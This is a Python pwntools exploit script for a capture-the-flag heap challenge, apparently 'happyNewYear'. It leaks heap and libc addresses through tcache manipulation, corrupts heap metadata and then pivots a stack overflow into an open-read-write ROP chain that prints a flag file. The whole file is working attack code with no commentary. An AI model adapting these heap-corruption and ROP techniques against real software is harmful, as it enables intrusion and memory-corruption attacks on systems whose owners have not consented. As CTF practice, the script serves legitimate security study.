from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'Your input: '
def add(idx, sidx, content):
	sla(menu, b'1')
	sla(b'idx: ', byte(idx))
	sla(b'): ', byte(sidx))
	sda(b'content: ', content)

def dele(idx):
	sla(menu, b'2')
	sla(b'idx: ', byte(idx))

def edit(idx, content):
	sla(menu, b'3')
	sla(b'idx: ', byte(idx))
	sda(b'content: ', content)	

def show(idx):
	sla(menu, b'4')
	sla(b'idx: ', byte(idx))

def stackOverflow(rop):
	sla(menu, b'666')
	sda(b'say?', rop)

# 0x10 0xF0 0x300 0x400
payload = p64(0)*2 + b'/home/isidro/pwnpwn/2020-buu-happyNewYear/flag\n'
for i in range(7):
	add(0, 4, payload)
	dele(0)

for i in range(6):
	add(16, 2, b'16')
	dele(16)

show(0)
heap_base = addr(6) - 0x26c0

add(0, 4, b'0')
add(1, 1, b'1')
dele(0)
show(0)
libc.address = addr64(b'\n') - 0x1e4ca0
print("heap_base : ", hex(heap_base))
print("libc_base : ", hex(libc.address))

pop_rdi = 0x0000000000026542 + libc.address # pop rdi ; ret 
pop_rsi = 0x0000000000026f9e + libc.address # pop rsi ; ret 
pop_rdx = 0x000000000012bda6 + libc.address # pop rdx ; ret
leave   = 0x0000000000058373 + libc.address # leave ; ret
o = libc.symbols['open']
r = libc.symbols['read']
w = libc.symbols['write']
orw  = p64(pop_rdi) + p64(heap_base+0x1280) + p64(pop_rsi) + p64(0) + p64(o)
orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap_base+0x1280) + p64(pop_rdx) + p64(0x40) + p64(r)
orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap_base+0x1280) + p64(pop_rdx) + p64(0x40) + p64(w)
rop = cyclic(0x80) + p64(heap_base+0x34D8) + p64(leave)
payload = p64(heap_base+0xA50) + p64(heap_base+0xA50)
add(1, 3, b'0')
add(2, 4, b'1')
print(hex(len(orw)))
payload  = orw.ljust(0x210, b'\x00') + p64(heap_base+0x37E0)+ p64(heap_base+0xA50)
payload  = payload.ljust(0x300, b'\x00')
payload += p64(0) + p64(0x101) + p64(libc.address+0x1e4ca0) + p64(heap_base+0x36E0)
edit(0, payload)
add(3, 2, b'3')
stackOverflow(rop)
#debug()

sh()
